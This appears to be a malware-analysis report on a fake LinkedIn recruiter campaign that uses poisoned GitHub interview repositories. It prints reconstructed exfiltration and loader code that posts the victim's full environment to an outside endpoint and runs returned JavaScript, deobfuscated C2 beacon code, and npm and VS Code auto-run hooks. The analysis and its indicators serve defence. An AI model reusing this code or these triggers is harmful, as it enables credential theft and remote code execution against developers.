---
title: "Japanese-Royal: Environment Harvesting and JavaScript RAT Delivered via Fake Developer Interview"
date: 2026-02-25
author: "ThreatProphet"
description: "Analysis of a fake recruiter campaign targeting blockchain developers via LinkedIn, delivering environment exfiltration and a multi-stage JavaScript RAT through malicious GitHub repositories."
tags:
  - contagious-interview
  - javascript
  - rat
  - linkedin-lure
  - node-js
  - vscode
  - environment-harvesting
  - vercel
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1059.007
  - T1059.004
  - T1059.003
  - T1071.001
  - T1027
  - T1552.001
  - T1119
  - T1082
  - T1016
  - T1571
  - T1585.001
  - T1585.002
  - T1583.001
report_id: "TP-2026-002"
showToc: true
---

> *"He came as a messenger with gifts, and the birds grew fat."*

## Executive Summary

A threat actor operating a fake recruiter persona on LinkedIn approached developers with a CTO-level opportunity at a fabricated Japanese e-commerce company. After establishing credibility through a polished project brief, the actor shared a GitHub repository named **Japanese-Royal** as part of a technical interview, directing the target to review and run the codebase. The repository contained a multi-stage implant reachable through several routine developer actions, including VS Code folder-open tasks, npm lifecycle hooks, normal startup scripts, and direct server execution.

The campaign's most operationally notable characteristic is its credential harvesting gate. Before delivering a Stage 2 beacon payload, Stage 1 POSTs the victim's complete `process.env` snapshot to an actor-controlled Vercel endpoint. This snapshot includes the actor's own planted variables from `frontend/.env` and `frontend/.env.local`, as well as any real credentials the victim has loaded into their environment - AWS keys, API tokens, database strings, or any other secrets present at runtime. The Stage 1 endpoint applies selective gating confirmed through direct testing: the gate condition is satisfied by the combined presence of variables from both planted files. A request without those values returns a benign decoy response. This means payload delivery does not require a victim to have real credentials: a developer who runs the repository in the expected project workflow can receive the Stage 2 loader once the planted environment files are loaded. Any real credentials in the victim's environment are exfiltrated as a side effect. The actor profits from the intrusion even if the victim terminates the process before Stage 2 establishes persistence - the environment snapshot is exfiltrated before any payload is requested.

Once active, the Stage 2 implant fingerprints the host and beacons every five seconds to a hardcoded C2 server, awaiting arbitrary JavaScript tasking. A second repository under the same GitHub account - **Betfin** - was identified using the same environment-exfiltration and dynamic-loader pattern, a separate but structurally equivalent Stage 1 endpoint, and byte-for-byte identical `.env.local` bait secrets. Its execution surface differs from Japanese-Royal, which indicates reuse of a common implant pattern across lure-specific project structures rather than a byte-for-byte repository clone.

TTPs are consistent with **DPRK-linked Contagious Interview-aligned** activity documented since 2023, though attribution is assessed at **low-to-medium confidence** based on TTP overlap rather than independently confirmed operator identity.

---

## Evidence Basis and Scope

This report is based on preserved repository mirrors, captured Stage 1 and Stage 2 payloads, Git commit metadata, DNS/WHOIS records, hash manifests, and controlled endpoint testing performed during the original investigation. The underlying evidence archive is not distributed with this public report; reproducibility is supported through SHA-256 hashes, repository names, commit metadata, observable code patterns, and network indicators.

Analytical statements in this report are separated into four categories:

- directly observed code behavior, including package scripts, VS Code task configuration, environment exfiltration, and dynamic JavaScript execution;
- captured infrastructure behavior, including Stage 1 decoy and loader responses and the Stage 2 C2 idle response;
- repository-cluster correlation based on shared files, lure themes, Git author metadata, and endpoint naming patterns;
- attribution assessment based on tradecraft overlap with public reporting on DPRK-linked Contagious Interview activity.

Attribution should be read as campaign alignment, not as a claim that the real-world operator identity has been independently established.

---

## Attack Overview

### Initial Contact

The actor contacted the target on LinkedIn under the persona "Yorka Morales M.", posing as a recruiter for a company called Commerce Media Inc. The opening message referenced the target's blockchain technology background and management experience, offering a remote CTO or senior advisory role. To establish legitimacy, the message included a link to a Google Docs project brief describing the company, its e-commerce platform, and open positions with compensation figures ranging from $100K to $280K annually.

The Google Docs document was well-constructed. It presented Commerce Media Inc. as a Japan-based technology company with offices across Europe, Asia, and America, specializing in crypto-enabled e-commerce. It described an in-progress platform named Japanese-Royal with plans for cryptocurrency payment integration, wallet support, and a native platform token. The document included a fabricated company branding header, a staffing table, and a section describing a retiring CTO whose replacement was actively being sought. No link to any repository appeared in the document - it functioned solely as a social engineering prop to make the subsequent interview request credible.

The GitHub repository was shared separately during the interview conversation, presented as the codebase the candidate would be assessed on.

### Repository Cluster

Five repositories were identified across three GitHub accounts, containing either the same malicious exfiltration/loader pattern or closely related lure themes:

| GitHub Account | Repository | Notes |
|---|---|---|
| `0xroaman-1` | `Japanese-Royal` | Primary lure repository, subject of this report |
| `0xroaman-1` | `Betfin` | Secondary lure, same exfiltration/loader pattern with different trigger surface |
| `0xroaman-2` | `Royal` | Lure repository, same theme/cluster pattern |
| `0xroaman-2` | `Betfin` | Duplicate lure theme across accounts |
| `0xroaman-4` | `Betfin` | Empty at time of analysis - possibly cleaned up |

The "Betfin" lure theme appears across all three accounts. The "Royal" theme appears across `0xroaman-1` (as Japanese-Royal) and `0xroaman-2`, suggesting deliberate theme reuse. Deploying identical lures across multiple accounts provides redundancy - if one account is reported and suspended, the others remain active and continue targeting victims.

All repositories with commits share byte-for-byte identical `.env.local` files (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`), confirming a common credential harvesting template reused across the full cluster.

Preserved repository HEAD metadata supports the timeline and repository-cluster assessment:

| Repository | HEAD commit | Git author | Commit date | Subject |
|---|---|---|---|---|
| `0xroaman-1/Japanese-Royal` | `c4ef41c4911b8d2869905bae62d519c96ded0c43` | `0xroaman-6 <0xsoftbuild+3[@]gmail[.]com>` | 2026-01-24T12:51:36+02:00 | `fix final API connection issue reset final outpoint` |
| `0xroaman-1/Betfin` | `61c3810d02431e6a3f94ce5c3119a17e42359056` | `0xroaman-6 <0xsoftbuild+3[@]gmail[.]com>` | 2026-01-23T13:59:57+02:00 | `update poker game logic flow feature fix authenticator issue` |
| `0xroaman-2/Betfin` | `0597ece5b59d2bbe06e59f49f28601c08ca8decd` | `0xroaman-2 <luis[@]commerce-media[.]org>` | 2026-02-04T09:25:00+01:00 | `update for normal function mc` |
| `0xroaman-4/Royal` | `75d715d100deca05da0b75f4aa5f1b0f151e1242` | `0xbuild-02 <victoriaknowles903+2[@]gmail[.]com>` | 2026-01-30T23:32:08+02:00 | `update final flow and fix output issue` |

### Campaign Timeline

| Date | Event |
|---|---|
| 2026-01-14 | `commerce-media[.]org` registered via Hostinger |
| 2026-01-19 | `commerce-media[.]org` updated - likely MX record configuration for operator email |
| 2026-01-23 | `0xroaman-1/Betfin` HEAD commit `61c3810d` by `0xroaman-6` (+0200) |
| 2026-01-24 | `0xroaman-1/Japanese-Royal` HEAD commit `c4ef41c` by `0xroaman-6` (+0200) |
| 2026-01-30 | `0xroaman-4/Royal` HEAD commit `75d715d` by `0xbuild-02` (+0200) |
| 2026-02-04 | `0xroaman-2/Betfin` HEAD commit `0597ece` by `0xroaman-2` / `luis[@]commerce-media[.]org` (+0100) |
| 2026-02-25 | Analysis conducted, C2 active in standby state |

The domain registration on 2026-01-14 predates the first repository commit by eleven days, and the 2026-01-19 update precedes commits by four days. This sequence is consistent with the operator establishing email infrastructure under the fake company identity before building the lure repositories.

### Kill Chain

1. Actor contacts target on LinkedIn with a CTO recruitment pitch and shares a Google Docs project brief for a fabricated company to establish credibility.
2. During the interview, the actor shares the `0xroaman-1/Japanese-Royal` GitHub repository as a technical assessment.
3. In Japanese-Royal, execution can be reached through several routine developer actions, including VS Code folder-open task execution, `npm start`, local `npm install` through the `prepare` lifecycle hook, or direct execution of the server entry point.
4. On execution, `api/auth.js` loads and calls `validateApiKey()` at module level, initiating Stage 1.
5. Stage 1 (`controllers/auth.js`) decodes the Stage 1 endpoint from Base64 stored in `frontend/.env`, then POSTs the victim's complete `process.env` to the endpoint - exfiltrating all runtime secrets including any `.env`-loaded credentials.
6. The Stage 1 endpoint checks for the combined presence of variables from the actor's planted `frontend/.env` and `frontend/.env.local`. If the gate is satisfied, it returns JavaScript which is executed immediately via `new Function('require', response.data)(require)`, granting full Node.js runtime access.
7. The returned Stage 2 payload fingerprints the host (hostname, MAC addresses, OS) and begins beaconing to `hxxp://174.138.188[.]80:3000/api/errorMessage` via HTTP GET every five seconds.
8. The C2 responds with `{"status":"ok","message":"server connected"}` in standby state. When tasking is active, a response with `status: "error"` causes the `message` field to be executed as arbitrary JavaScript.

---

## Technical Analysis

### Execution Triggers

Japanese-Royal implements multiple execution paths, making it resilient against partial defenses. A developer who avoids VS Code automatic tasks but runs a local `npm install` in the frontend project can still trigger execution through the npm `prepare` lifecycle hook. A developer who reviews `tasks.json` but runs `npm start` can also trigger the same server entry point. These paths ultimately execute `server/server.js`, which loads the malicious route module and initiates Stage 1. The extracted package scripts show that `npm run dev` is only `next dev`; it is not itself a direct server trigger, although the VS Code task can first invoke `npm install`, which then triggers `prepare`.

**Trigger 1 - VS Code folder open (`tasks.json`)**

`.vscode/tasks.json` defines a folder-open task named `frontend-nextjs-dev` that runs `npm run dev` and depends on a preceding `frontend-npm-install` task. The install task itself does not contain `runOn: folderOpen`, but it is invoked as a dependency of the folder-open task. In a trusted workspace, or where automatic tasks have already been allowed for the folder, opening the repository in VS Code can therefore execute `npm install` first, which reaches the malicious `prepare` lifecycle hook. VS Code normally prompts before allowing automatic tasks the first time such a folder is opened, so this is best described as abuse of a developer-trust workflow rather than a universal no-prompt execution primitive.

```json
{
  "label": "frontend-nextjs-dev",
  "type": "shell",
  "command": "npm run dev",
  "options": {
    "cwd": "${workspaceFolder}/frontend"
  },
  "dependsOn": "frontend-npm-install",
  "dependsOrder": "sequence",
  "runOptions": {
    "runOn": "folderOpen"
  },
}
```

**Trigger 2 - `npm start`**

`frontend/package.json` defines the `start` script as:

```json
"start": "node server/server.js | next dev"
```

The shell pipeline starts the malicious `server/server.js` as part of the same command used to launch the legitimate-looking Next.js development server. This hides the server entry point behind an expected developer workflow and makes the malicious process appear coupled to normal project startup.

**Trigger 3 - `npm install` (prepare hook)**

```json
"prepare": "node server/server.js | next dev"
```

The `prepare` lifecycle hook runs during a local `npm install` without package arguments. Running `npm install` inside `frontend/`, including when triggered by the VS Code task, starts `server/server.js`, loads the malicious route module, and executes Stage 1: environment exfiltration and loader delivery occur as part of normal dependency-install workflow. A developer running `npm install` to inspect or audit the project can therefore trigger the implant before intentionally starting the application.

**Trigger 4 - Direct execution**

Any explicit invocation of `node server/server.js` triggers Stage 1. The extracted Japanese-Royal `dev` script is `next dev`, so `npm run dev` should not be treated as a direct server trigger unless another project path invokes the backend server separately.

### Stage 1: Environment Exfiltration and Loader Delivery

The Stage 1 logic is split across two files. `frontend/server/routes/api/auth.js` calls `validateApiKey()` as a top-level module assignment, meaning Stage 1 fires at import time - during server startup - without any HTTP request being required:

```javascript
// frontend/server/routes/api/auth.js
const verified = validateApiKey(); // executes at module load, not on request
```

`frontend/server/controllers/auth.js` implements the exfiltration and loader:

```javascript
// frontend/server/controllers/auth.js (reconstructed)
const s = (str) => atob(str); // Base64 decode helper

async function validateApiKey() {
  const api = s(process.env.AUTH_API); // decode endpoint from .env
  try {
    const response = await axios.post(
      api,
      { ...process.env },              // exfiltrate full environment
      { headers: { 'x-app-request': 'ip-check' } }
    );
    const executor = new Function('require', response.data);
    executor(require);                 // execute returned JavaScript
  } catch (e) {}
}
```

`frontend/.env` contains the Base64-encoded Stage 1 endpoint:

```
AUTH_API=<base64>   # decodes to: hxxps://ip-check-notification-firebase.vercel[.]app/api
```

The same file contains numerous variables designed to resemble real developer secrets - AWS access keys, Stripe keys, OpenAI API keys, Infura project credentials, and session secrets. These planted variables satisfy the Stage 1 gate condition and will be present in any victim's `process.env` snapshot. Any additional real credentials the victim has loaded into their environment are exfiltrated alongside them.

**Stage 1 selective gating:** The endpoint's gating behavior was confirmed through direct testing. The gate condition is satisfied by the combined presence of variables from both `frontend/.env` and `frontend/.env.local` - the two configuration files planted by the actor in the repository. A request containing only generic environment variables returns the benign decoy response. A request containing the values from both planted files returns the loader payload.

This means the gate is not screening for a victim's real credentials. It is screening for evidence that the victim's Node.js process loaded the actor's own planted files. A developer who runs the repository in a clean environment with no real secrets can still receive the Stage 2 payload if the expected `.env` and `.env.local` values are loaded. The bait secrets therefore serve a dual function: they make the exfiltrated environment snapshot appear valuable for credential theft, and they act as the unlock condition for payload delivery.

The decoy response returned to requests that do not satisfy the gate:

```json
{
  "status": "OK",
  "message": "Public API response",
  "client": {
    "ipAddress": "...",
    "vpnDetected": false,
    "note": "Connection appears normal."
  }
}
```

This cover response serves as both a researcher deterrent and a plausible decoy if the victim inspects outbound network traffic.

### Stage 2: Host Fingerprinting and C2 Beacon

The Stage 2 payload delivered by the Stage 1 endpoint is an obfuscated JavaScript beacon. The obfuscation uses a rotating string array with an integrity self-check based on `Function.prototype.toString` and a ReDoS-pattern string (`(((.+)+)+)+$`) used as an identity fingerprint to detect instrumented environments. The deobfuscated logic is as follows:

```javascript
// Stage 2 - deobfuscated and annotated
const axios = require('axios');
const os    = require('os');

let instanceId = 0;

async function beacon() {
  try {
    const sysInfo = {
      hostname : os.hostname(),
      macs     : Object.values(os.networkInterfaces())
                   .flat()
                   .filter(Boolean)
                   .map(m => m.mac)
                   .filter(m => m && '00:00:00:00:00:00' !== m), // exclude null MACs
      os       : os.platform() + ' ' + os.release() + ' (' + os.type() + ')'
    };

    const response = await axios.get(
      'hxxp://174.138.188[.]80:3000/api/errorMessage' // defanged for publication,
      {
        params: {
          sysInfo     : sysInfo,
          exceptionId : 'env070722',   // hardcoded campaign marker
          instanceId  : instanceId
        }
      }
    );

    if ('error' === response.data.status) {
      // C2 returned tasking - execute it
      const task = response.data.message || 'Unknown error';
      new Function('require', task)(require);
    } else if (response.data.instanceId) {
      // C2 assigned a session identifier - store for future beacons
      instanceId = response.data.instanceId;
    }

  } catch (e) {}
}

beacon();
setInterval(beacon, 5000); // beacon every 5 seconds
```

The campaign marker `exceptionId=env070722` is hardcoded. The `0722` suffix follows the same format observed in TP-2026-001, where the campaign marker was `env991228`. These suffixes may represent campaign dates in MMDD format (July 22 and December 28 respectively), operator identifiers, or version markers. The relationship between these values is unconfirmed.

### Stage 3: C2 Tasking

At the time of analysis, the C2 at `174.138.188[.]80:3000` returned an idle response to all queries regardless of parameters:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{"status":"ok","message":"server connected"}
```

The identical `ETag` value (`W/"2c-C+DUpHd4h+gH5EGTBj3pzaIUfSY"`) was returned for requests both with and without `sysInfo`/`exceptionId` parameters, confirming a static response at time of capture. This is consistent with tasking being disabled or rotated following exposure, or with additional server-side gating on `instanceId` or source IP that was not satisfied by the analysis requests. The C2 infrastructure is Express.js-based, running on TCP/3000 over plain HTTP.

When active, the C2 delivers arbitrary JavaScript to the beacon via the `message` field under a `status: "error"` response. This payload is executed via the same `new Function('require', payload)(require)` primitive, providing full Node.js runtime access including filesystem operations, process execution, and network activity.

### Betfin: Corroborating Repository

The second repository under `0xroaman-1`, **Betfin**, implements the same environment-exfiltration and dynamic-loader pattern, but its trigger surface is not identical to Japanese-Royal. Key structural elements are consistent across both repositories:

- `AUTH_API` Base64-encoded in `.env`, decoding to a distinct but structurally equivalent Stage 1 endpoint: `hxxps://ip-checking-notification-pic.vercel[.]app/api`
- Same `verify(setApiKey(process.env.AUTH_API))` route-load execution pattern in `routes/api/auth.js`
- Same `axios.post(api, { ...process.env }, ...)` environment exfiltration pattern in `controllers/auth.js`
- Same `new Function("require", response.data)` loader primitive in the route module
- Byte-for-byte identical `.env.local` (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`) confirming a shared credential-harvesting template

The trigger implementation differs. Betfin's client package contains conventional React scripts, while the repository root contains a `prepare` hook that starts the backend using `start /b node server || nohup node server &`. Betfin's VS Code task file also contains two `runOn: folderOpen` tasks: one runs `npm install --silent --no-progress`, and one runs `node server.js`. This strengthens the cluster assessment because the same implant pattern was adapted to a different application layout rather than copied as a single unchanged project.

The Betfin Stage 1 endpoint subdomain follows the same naming convention as the Japanese-Royal endpoint: both match the pattern `ip-check[ing]-notification-[suffix].vercel.app`. The use of separate endpoints per repository suggests per-lure infrastructure isolation, either for operational security or to allow independent targeting of different victim pools.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment lure with Google Docs project brief and GitHub repository delivery |
| T1204.002 | Malicious File | Execution | Victim runs or opens a malicious project as part of a technical assessment |
| T1059.007 | JavaScript | Execution | `new Function('require', payload)(require)` execution in Node.js |
| T1059.004 | Unix Shell | Execution | VS Code tasks and npm scripts can launch shell-backed project commands on macOS/Linux |
| T1059.003 | Windows Command Shell | Execution | Windows task variants use command-shell execution paths where present |
| T1027 | Obfuscated Files or Information | Defense Evasion | Rotating string-array obfuscation and Base64-encoded Stage 1 endpoint |
| T1552.001 | Credentials in Files | Credential Access | `.env` and `.env.local` values are loaded into `process.env` and exfiltrated |
| T1119 | Automated Collection | Collection | Full runtime environment snapshot POSTed to Stage 1 endpoint |
| T1082 | System Information Discovery | Discovery | Hostname and OS profiling |
| T1016 | System Network Configuration Discovery | Discovery | Network interface and MAC address enumeration |
| T1071.001 | Web Protocols | Command and Control | HTTP beaconing to `/api/errorMessage` |
| T1571 | Non-Standard Port | Command and Control | Plain HTTP C2 on TCP/3000 |
| T1585.001 | Social Media Accounts | Resource Development | LinkedIn recruiter persona and related social-engineering accounts |
| T1585.002 | Email Accounts | Resource Development | Git author and lure-domain email artifacts |
| T1583.001 | Domains | Resource Development | `commerce-media[.]org` registered for the fake company identity |

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `174.138.188[.]80` | IPv4 | Stage 2/3 C2 server, TCP/3000, Express.js |
| `174.138.188[.]80:3000/api/errorMessage` | URL | Beacon endpoint, active at time of analysis |
| `ip-check-notification-firebase.vercel[.]app` | Domain | Stage 1 endpoint, Japanese-Royal |
| `ip-check-notification-firebase.vercel[.]app/api` | URL | Exfiltration and loader delivery path |
| `ip-checking-notification-pic.vercel[.]app` | Domain | Stage 1 endpoint, Betfin |
| `ip-checking-notification-pic.vercel[.]app/api` | URL | Exfiltration and loader delivery path |

Both Stage 1 domains are Vercel-hosted and follow the naming convention `ip-check[ing]-notification-[suffix].vercel.app`. This pattern overlaps with Vercel-hosted delivery domains documented in TP-2026-001, which also used Vercel for Stage 1 infrastructure across multiple repository variants.

**C2 server details:**

| Field | Value |
|---|---|
| IP | `174.138.188[.]80` |
| Port | TCP/3000 |
| Server | Express.js (`X-Powered-By: Express`) |
| Protocol | HTTP (plaintext) |
| Status at analysis | Active, idle response |

### Operator Domain Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `commerce-media[.]org` | Domain | Registered 2026-01-14, Hostinger, parked - no live web content |
| `84.32.84[.]32` | IPv4 | Hostinger shared parking IP, no co-hosted campaign infrastructure identified |
| `luis[@]commerce-media[.]org` | Email | Git author identity for `0xroaman-2` commits, domain matches lure company name |

The domain `commerce-media[.]org` was registered eleven days before the first repository commit, with a DNS update five days later consistent with MX record configuration. The domain name directly matches the fake company identity ("Commerce Media Inc.") used in the Google Docs lure document, confirming it was purpose-built for this campaign. The operator registered a custom email domain rather than using a free provider for at least one Git identity, representing a deliberate operational preparation step.

### Git Author and Persona Artifacts

Git author metadata contains both campaign-relevant identities and historical/upstream-looking authors. These values should be treated as operational persona artifacts, not as verified real-world identities. In each case, the repository-hosting account name can differ from the Git author name configured in commits, indicating separation between GitHub account naming and commit identity.

Campaign-relevant HEAD or lure-cluster identities:

| Git Author Name | Git Author Email | Timezone / Context | Repositories | Notes |
|---|---|---|---|---|
| `0xroaman-6` | `0xsoftbuild+3[@]gmail[.]com` | +0200 in HEAD commits | `0xroaman-1/Japanese-Royal`, `0xroaman-1/Betfin` | Primary Git author identity for the `0xroaman-1` repositories |
| `0xbuild-02` | `victoriaknowles903+2[@]gmail[.]com` | +0200 in HEAD commit | `0xroaman-4/Royal` | Secondary Git author identity using the same observed timezone offset |
| `0xroaman-2` | `luis[@]commerce-media[.]org` | +0100 in HEAD commit | `0xroaman-2/Betfin` | Custom-domain Git author identity matching the lure company domain |
| `0xroaman-1` | `luiscordes0102+2[@]gmail[.]com` | Historical cluster author | `0xroaman-1/Japanese-Royal` | Additional cluster-linked Git identity; not the HEAD author |
| `0x-builder`, `0xroaman-7`, `0xtopteam`, `topbuilder5` | `luiscordes*[@]gmail[.]com` variants | Historical cluster authors | `0xroaman-4/Royal` | Additional lure-cluster identities using repeated `luiscordes` naming pattern |

The history also contains unrelated or upstream-looking authors such as `AbhisheJha1916`, `Anderson`, `Austin Pugh`, `Temple Jett`, and others. Those should not be promoted to operator IOCs unless a specific malicious commit, repository takeover, or direct infrastructure relationship is established.

The Gmail addresses use plus-addressing with numeric tags, which may support per-account or per-campaign sorting from a shared inbox. This is an operational clue, but not a reliable attribution marker by itself. The timezone offsets are likewise useful for clustering commit activity, but should not be interpreted as operator geolocation without corroborating evidence.

### Repository Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `github.com/0xroaman-1` | GitHub Account | Hosts Japanese-Royal and Betfin |
| `github.com/0xroaman-2` | GitHub Account | Hosts Royal and Betfin |
| `github.com/0xroaman-4` | GitHub Account | Hosts empty Betfin repo |
| `github.com/0xroaman-1/Japanese-Royal` | Repository | Primary lure |
| `github.com/0xroaman-1/Betfin` | Repository | Secondary lure |
| `github.com/0xroaman-2/Royal` | Repository | Lure, same theme/cluster pattern |
| `github.com/0xroaman-2/Betfin` | Repository | Lure, duplicate theme |
| `github.com/0xroaman-4/Betfin` | Repository | Empty at time of analysis |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| `174.138.188[.]80` | IPv4 | High |
| `174.138.188[.]80:3000` | IP:Port | High |
| `/api/errorMessage?exceptionId=env070722` | URL pattern | High |
| `ip-check-notification-firebase.vercel[.]app` | Domain | High |
| `ip-checking-notification-pic.vercel[.]app` | Domain | High |
| `commerce-media[.]org` | Domain | High |
| `84.32.84[.]32` | IPv4 | Medium - Hostinger shared parking, low specificity |

### Operator Identity Indicators

| Indicator | Type | Notes |
|---|---|---|
| `0xsoftbuild+3[@]gmail[.]com` | Email | Git author email, `0xroaman-1` repos, base: `0xsoftbuild[@]gmail[.]com` |
| `victoriaknowles903+2[@]gmail[.]com` | Email | Git author email, `0xroaman-4/Royal`, base: `victoriaknowles903[@]gmail[.]com` |
| `luis[@]commerce-media[.]org` | Email | Git author email for `0xroaman-2/Betfin`; domain matches lure company name |
| `luiscordes0102+2[@]gmail[.]com` | Email | Historical Git author in Japanese-Royal; cluster-relevant but not HEAD author |
| `luiscordes25[@]gmail[.]com`, `luiscordes25+2[@]gmail[.]com`, `luiscordes162+5[@]gmail[.]com`, `luiscordes0102+1[@]gmail[.]com` | Email pattern | Historical Git authors in Royal; cluster-relevant naming pattern |
| `commerce-media[.]org` | Domain | Registered 2026-01-14, Hostinger, matches lure company name |
| `0xroaman-6` | Git author name | HEAD commits to `0xroaman-1` repos |
| `0xbuild-02` | Git author name | HEAD commit to `0xroaman-4/Royal` |
| `0xroaman-2` | Git author name | HEAD commit to `0xroaman-2/Betfin` |
| Commit timezone `+0200` | Pattern | Observed in `0xroaman-1` and `0xroaman-4` HEAD commits |

### Repository and Code Indicators

| Indicator | Type | Notes |
|---|---|---|
| `github.com/0xroaman-1/Japanese-Royal` | Repository | Primary lure repository |
| `github.com/0xroaman-1/Betfin` | Repository | Secondary lure |
| `github.com/0xroaman-2/Royal` | Repository | Lure, same theme/cluster pattern |
| `github.com/0xroaman-2/Betfin` | Repository | Lure, duplicate theme |
| `github.com/0xroaman-4/Betfin` | Repository | Empty at time of analysis |
| `c4ef41c4911b8d2869905bae62d519c96ded0c43` | Commit | Preserved Japanese-Royal HEAD |
| `61c3810d02431e6a3f94ce5c3119a17e42359056` | Commit | Preserved `0xroaman-1/Betfin` HEAD |
| `0597ece5b59d2bbe06e59f49f28601c08ca8decd` | Commit | Preserved `0xroaman-2/Betfin` HEAD |
| `75d715d100deca05da0b75f4aa5f1b0f151e1242` | Commit | Preserved `0xroaman-4/Royal` HEAD |
| `0xroaman-1` | GitHub account | Repository-hosting account observed in cluster |
| `0xroaman-2` | GitHub account | Repository-hosting account observed in cluster |
| `0xroaman-4` | GitHub account | Repository-hosting account observed in cluster |
| `runOn: folderOpen` in `.vscode/tasks.json` | Code pattern | VS Code auto-execution trigger |
| `new Function('require', response.data)(require)` | Code pattern | Dynamic execution primitive, all stages |
| `{ ...process.env }` POST to decoded URL | Code pattern | Environment exfiltration |
| `x-app-request: ip-check` | HTTP header | Stage 1 request identifier |
| `exceptionId=env070722` | Beacon parameter | Hardcoded campaign marker |
| Beacon interval `0x1388` (5000ms) | Code pattern | Stage 2 polling interval |

### File and Payload Hashes

These hashes are provided for independent comparison with collected samples, repository mirrors, and captured payloads. The underlying evidence archive is not distributed with this report.

| SHA256 | Artifact | Notes |
|---|---|---|
| `48c6d172a43919df05ec9f506a1483e4c0fe820ea72092888d77b985aa7109c4` | `.vscode/tasks.json` | VS Code auto-execution config (Japanese-Royal) |
| `603f46ba670a4be0bcf23429015ab00ccef04dc278bffc2d855eb8de52f9e711` | `frontend/.env` | Contains Base64-encoded Stage 1 endpoint and bait secrets |
| `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `frontend/.env.local` | Bait secrets - identical across Japanese-Royal and Betfin |
| `865dd0484235a1bbe46241812e2bbdbe36101f1f8b3741aaecbfa819ae190167` | `frontend/server/controllers/auth.js` | Stage 1 exfiltration and loader logic |
| `280f0138f8eff29392c93d52d639c049849143d8628914d6e82949fd714ee939` | `frontend/server/routes/api/auth.js` | Module-load execution trigger |
| `9c7b96baaf461c9ca46db4472d5c65faec468b83db20ef1df25d6bde2bfa928d` | `frontend/package.json` | Contains `start` and `prepare` trigger scripts |
| `a25f293776496f991565b0b5e6103e3948fa99acf6f1d45482c794fd52023855` | `post-payload.txt` | Captured Stage 2 beacon payload (obfuscated) |
| `cc912c054e84000095b4e92fc8da36e4245eb6ad9d29dc1f102d05e566c90324` | `payload.js` | Stage 1 decoy response (benign) |
| `c49175c4e9d08fc6a242649815c716d0f445fb4229dbf22395fde99f25119a21` | `Betfin/.env` | Contains Base64-encoded Stage 1 endpoint (distinct from Japanese-Royal) |
| `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `Betfin/.env.local` | Byte-for-byte identical to Japanese-Royal `.env.local` |
| `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd` | `Betfin/routes/api/auth.js` | Same execution trigger pattern |
| `cc9e443872d99b07e4bf5f6baa6144fbe0fd24bc610e58340d9b8c755df17fce` | `Betfin/controllers/auth.js` | Same exfiltration and loader logic |

---

## Attribution Assessment

**Assessed confidence: Low-to-Medium**

The activity is best described as **DPRK-linked Contagious Interview-aligned** based on tradecraft overlap, not on independently confirmed operator identity. Public reporting on Contagious Interview describes fake recruiter workflows, developer-focused technical assessments, code-repository delivery, JavaScript malware, BeaverTail/InvisibleFerret tooling, and cryptocurrency-adjacent targeting. This report's observed behavior is consistent with that broader activity pattern.

Key overlaps include:

- LinkedIn recruitment lure targeting a developer with blockchain and management experience;
- fake technical interview using a GitHub-hosted codebase as the execution vector;
- crypto/Web3 project theming;
- `.vscode/tasks.json` `runOn: folderOpen` abuse as one execution path;
- npm lifecycle/script execution paths that make routine developer commands dangerous;
- Vercel-hosted Stage 1 infrastructure;
- obfuscated JavaScript loader and beacon code;
- host fingerprinting using hostname, OS information, and MAC addresses;
- HTTP C2 over TCP/3000 using a hardcoded `exceptionId` campaign marker.

The activity also differs from TP-2026-001 in important ways. TP-2026-001 used BSC smart-contract payload staging, while this report documents Vercel-based environment exfiltration and loader delivery. The C2 IP, GitHub accounts, lure company, and Stage 1 endpoint naming are different. These differences may indicate separate sub-campaigns, operator rotation, or reuse of a common toolkit by related operators. They do not prove a single operator.

Git author names, email addresses, plus-addressing, commit timezones, and lure-domain registration are useful for infrastructure clustering and pivoting. The new author extraction also shows historical/upstream-looking authors in the repositories, reinforcing the need to separate malicious HEAD/lure-cluster commits from inherited project history. None of these artifacts should be treated as personal attribution. They can be fabricated, borrowed, compromised, inherited from cloned codebases, or intentionally misleading.

Attribution remains tentative. The evidence supports alignment with Contagious Interview tradecraft; it does not independently prove Lazarus Group tasking or a specific DPRK operator.

**Prior reporting:**
- [MITRE ATT&CK - Contagious Interview / G1052](https://attack.mitre.org/groups/G1052/)
- [Palo Alto Unit42 - Two Job-Related Campaigns Bear Hallmarks of North Korea-Sponsored Threat Actors](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [Palo Alto Unit42 - DPRK Threat Actors Lure Tech Job Seekers as Fake Recruiters](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/)
- [Microsoft - Contagious Interview malware delivered through fake developer job interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
- [ThreatProphet TP-2026-001 - Interview Trap](https://threatprophet.com/posts/2026-02-24-interview-trap/)

---

## Remediation

### If You Ran the Repository

Treat this as a confirmed credential compromise regardless of how briefly the code ran. Stage 1 exfiltrates `process.env` synchronously on startup - the leak occurs before any visible output.

- Isolate the affected machine from the network immediately
- Rotate all credentials that may have been present in the environment: AWS access keys, API tokens, database connection strings, private keys, OAuth secrets, and any variables loaded from `.env` or `.env.local` files
- Audit cloud provider access logs for anomalous API calls in the period following execution - credential use may have begun within seconds
- Check for persistence mechanisms: cron jobs, `launchd` agents (macOS), systemd units, registry Run keys (Windows), and any new files in `~/.vscode/` or home directory subdirectories
